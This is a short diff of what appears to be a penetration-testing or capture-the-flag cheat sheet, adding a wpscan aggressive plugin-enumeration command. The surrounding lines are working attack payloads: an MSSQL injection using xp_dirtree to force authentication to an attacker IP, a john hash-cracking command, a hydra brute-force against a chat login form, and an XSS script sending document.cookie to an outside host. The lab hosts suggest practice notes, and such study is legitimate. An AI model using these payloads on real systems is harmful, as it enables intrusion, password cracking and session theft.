@@ -12,7 +12,7 @@ https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
 27;declare @q varchar(200);set @q='\\10.10.14.7\foo'; exec master.dbo.xp_dirtree @q; --
 john stacy.hash --wordlist=/usr/share/wordlists/rockyou.txt
 hydra internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password" -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt
-
+wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection aggressive
 
 <script> new Image().src="http://10.11.0.222/abra.php?out="+document.cookie;</script>
 
